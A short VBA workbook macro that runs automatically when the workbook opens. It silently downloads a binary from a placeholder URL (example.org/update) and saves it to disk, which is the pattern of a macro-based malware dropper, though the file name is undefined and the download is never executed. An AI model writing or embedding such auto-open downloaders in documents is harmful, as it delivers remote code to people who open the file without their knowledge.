Private Sub Workbook_Open()
  Set network = CreateObject("WinHttp.WinHttpRequest.5.1")
  network.Open "GET", "https://example.org/update", False
  network.Send
  Set output = CreateObject("ADODB.Stream")
  output.Type = 1
  output.Write network.ResponseBody
  output.SaveToFile filename, 2
End Sub
